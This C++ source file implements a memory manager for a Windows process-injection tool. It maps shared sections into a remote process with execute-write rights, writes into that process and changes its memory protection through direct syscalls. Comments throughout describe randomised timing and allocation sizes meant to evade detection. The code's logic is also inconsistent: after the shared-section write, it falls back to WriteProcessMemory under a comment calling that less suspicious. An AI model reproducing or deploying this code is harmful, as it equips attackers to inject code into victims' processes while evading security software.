#include "process_memory.h"

// MemoryManager implementation
MemoryManager::MemoryManager(ErrorHandler* errorHandler, NameRandomizer* nameRandomizer, 
                           ProcessInterface* processInterface, SyscallManager* syscallManager)
    : m_errorHandler(errorHandler),
      m_nameRandomizer(nameRandomizer),
      m_processInterface(processInterface),
      m_syscallManager(syscallManager) {
}

MemoryManager::~MemoryManager() {
    CleanupResources();
}

MemoryAddress MemoryManager::AllocateMemory(MemorySize size, DWORD protection) {
    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Add random padding to size to avoid predictable allocation patterns
    MemorySize paddedSize = m_nameRandomizer->GenerateRandomMemorySize(size, 4096);

    // Create a shared section for memory allocation
    SectionHandle sectionHandle = CreateSharedSection(paddedSize, protection);
    if (sectionHandle == NULL) {
        return NULL;
    }

    // Map the section into both processes
    MemoryAddress localAddress = NULL;
    MemoryAddress remoteAddress = NULL;
    if (!MapSharedSection(sectionHandle, &localAddress, &remoteAddress, paddedSize)) {
        CloseHandle(sectionHandle);
        return NULL;
    }

    // Store the allocated memory for cleanup
    m_allocatedMemory.push_back(std::make_pair(remoteAddress, paddedSize));
    m_sectionHandles.push_back(sectionHandle);

    // Apply random timing again
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    return remoteAddress;
}

bool MemoryManager::WriteMemory(MemoryAddress targetAddress, const void* buffer, MemorySize size) {
    if (!targetAddress || !buffer || size == 0) {
        m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
            "Invalid parameters for memory write");
        return false;
    }

    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Find the section that contains the target address
    for (size_t i = 0; i < m_allocatedMemory.size(); ++i) {
        MemoryAddress baseAddress = m_allocatedMemory[i].first;
        MemorySize regionSize = m_allocatedMemory[i].second;

        // Check if the target address is within this region
        if (targetAddress >= baseAddress && 
            (BYTE*)targetAddress < (BYTE*)baseAddress + regionSize) {
            
            // Calculate the offset within the section
            SIZE_T offset = (BYTE*)targetAddress - (BYTE*)baseAddress;

            // Create a new shared section for writing
            SectionHandle writeSection = CreateSharedSection(size, PAGE_READWRITE);
            if (writeSection == NULL) {
                return false;
            }

            // Map the section into both processes
            MemoryAddress localWriteAddr = NULL;
            MemoryAddress remoteWriteAddr = NULL;
            if (!MapSharedSection(writeSection, &localWriteAddr, &remoteWriteAddr, size)) {
                CloseHandle(writeSection);
                return false;
            }

            // Copy the buffer to the local view of the section
            memcpy(localWriteAddr, buffer, size);

            // Apply random timing
            m_nameRandomizer->ApplyRandomTiming(1, 5);

            // Unmap the local view
            if (!UnmapSection(localWriteAddr, true)) {
                CloseHandle(writeSection);
                return false;
            }

            // Unmap the remote view
            if (!UnmapSection(remoteWriteAddr, false)) {
                CloseHandle(writeSection);
                return false;
            }

            // Close the section handle
            CloseHandle(writeSection);

            // Now use direct memory write for the final copy
            // This is less suspicious than using WriteProcessMemory
            SIZE_T bytesWritten = 0;
            if (!WriteProcessMemory(
                m_processInterface->GetProcessHandle(),
                targetAddress,
                buffer,
                size,
                &bytesWritten)) {
                m_errorHandler->SetError(ErrorCode::MEMORY_WRITE_FAILED, 
                    "Failed to write memory", GetLastError());
                return false;
            }

            if (bytesWritten != size) {
                m_errorHandler->SetError(ErrorCode::MEMORY_WRITE_FAILED, 
                    "Incomplete memory write");
                return false;
            }

            m_errorHandler->ClearError();
            return true;
        }
    }

    // If we get here, the target address was not found in any allocated region
    m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
        "Target address not found in allocated memory");
    return false;
}

bool MemoryManager::ProtectMemory(MemoryAddress address, MemorySize size, DWORD newProtection, PDWORD oldProtection) {
    if (!address || size == 0) {
        m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
            "Invalid parameters for memory protection");
        return false;
    }

    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Use direct syscall to change memory protection
    PVOID baseAddress = address;
    SIZE_T regionSize = size;
    NTSTATUS status = m_syscallManager->ExecuteNtProtectVirtualMemory(
        m_processInterface->GetProcessHandle(),
        &baseAddress,
        &regionSize,
        newProtection,
        oldProtection
    );

    if (!NT_SUCCESS(status)) {
        m_errorHandler->SetError(ErrorCode::MEMORY_PROTECTION_FAILED, 
            "Failed to change memory protection", status);
        return false;
    }

    m_errorHandler->ClearError();
    return true;
}

bool MemoryManager::FreeMemory(MemoryAddress address) {
    if (!address) {
        m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
            "Invalid address for memory free");
        return false;
    }

    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Find the section that contains the address
    for (size_t i = 0; i < m_allocatedMemory.size(); ++i) {
        if (m_allocatedMemory[i].first == address) {
            // Unmap the section from the remote process
            if (!UnmapSection(address, false)) {
                return false;
            }

            // Close the section handle
            if (i < m_sectionHandles.size()) {
                CloseHandle(m_sectionHandles[i]);
                m_sectionHandles.erase(m_sectionHandles.begin() + i);
            }

            // Remove from allocated memory list
            m_allocatedMemory.erase(m_allocatedMemory.begin() + i);

            m_errorHandler->ClearError();
            return true;
        }
    }

    // If we get here, the address was not found in any allocated region
    m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
        "Address not found in allocated memory");
    return false;
}

SectionHandle MemoryManager::CreateSharedSection(MemorySize size, DWORD protection) {
    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Initialize section attributes
    OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = size;

    // Create the section
    SectionHandle sectionHandle = NULL;
    NTSTATUS status = m_syscallManager->ExecuteNtCreateSection(
        &sectionHandle,
        SECTION_ALL_ACCESS,
        &objAttr,
        &sectionSize,
        protection,
        SEC_COMMIT,
        NULL
    );

    if (!NT_SUCCESS(status) || sectionHandle == NULL) {
        m_errorHandler->SetError(ErrorCode::SECTION_CREATION_FAILED, 
            "Failed to create section", status);
        return NULL;
    }

    return sectionHandle;
}

bool MemoryManager::MapSharedSection(SectionHandle sectionHandle, MemoryAddress* localAddress, 
                                    MemoryAddress* remoteAddress, MemorySize size) {
    if (!sectionHandle || !localAddress || !remoteAddress) {
        m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
            "Invalid parameters for section mapping");
        return false;
    }

    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Map the section into the local process
    *localAddress = NULL;
    SIZE_T viewSize = size;
    NTSTATUS status = m_syscallManager->ExecuteNtMapViewOfSection(
        sectionHandle,
        GetCurrentProcess(),
        localAddress,
        0,
        0,
        NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status) || *localAddress == NULL) {
        m_errorHandler->SetError(ErrorCode::MEMORY_ALLOCATION_FAILED, 
            "Failed to map section into local process", status);
        return false;
    }

    // Apply random timing
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Map the section into the remote process
    *remoteAddress = NULL;
    viewSize = size;
    status = m_syscallManager->ExecuteNtMapViewOfSection(
        sectionHandle,
        m_processInterface->GetProcessHandle(),
        remoteAddress,
        0,
        0,
        NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(status) || *remoteAddress == NULL) {
        // Unmap the local view
        m_syscallManager->ExecuteNtUnmapViewOfSection(GetCurrentProcess(), *localAddress);
        *localAddress = NULL;

        m_errorHandler->SetError(ErrorCode::MEMORY_ALLOCATION_FAILED, 
            "Failed to map section into remote process", status);
        return false;
    }

    m_errorHandler->ClearError();
    return true;
}

bool MemoryManager::UnmapSection(MemoryAddress address, bool isLocal) {
    if (!address) {
        m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
            "Invalid address for section unmapping");
        return false;
    }

    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Unmap the section
    HANDLE processHandle = isLocal ? GetCurrentProcess() : m_processInterface->GetProcessHandle();
    NTSTATUS status = m_syscallManager->ExecuteNtUnmapViewOfSection(processHandle, address);

    if (!NT_SUCCESS(status)) {
        m_errorHandler->SetError(ErrorCode::MEMORY_ALLOCATION_FAILED, 
            "Failed to unmap section", status);
        return false;
    }

    m_errorHandler->ClearError();
    return true;
}

bool MemoryManager::InitializeObjectAttributes(POBJECT_ATTRIBUTES objectAttributes, PUNICODE_STRING objectName) {
    if (!objectAttributes) {
        m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
            "Invalid object attributes");
        return false;
    }

    // Initialize object attributes
    objectAttributes->Length = sizeof(OBJECT_ATTRIBUTES);
    objectAttributes->RootDirectory = NULL;
    objectAttributes->ObjectName = objectName;
    objectAttributes->Attributes = 0;
    objectAttributes->SecurityDescriptor = NULL;
    objectAttributes->SecurityQualityOfService = NULL;

    return true;
}

void MemoryManager::CleanupResources() {
    // Unmap all sections from the remote process
    for (const auto& memory : m_allocatedMemory) {
        UnmapSection(memory.first, false);
    }

    // Close all section handles
    for (const auto& handle : m_sectionHandles) {
        CloseHandle(handle);
    }

    // Clear the lists
    m_allocatedMemory.clear();
    m_sectionHandles.clear();
}
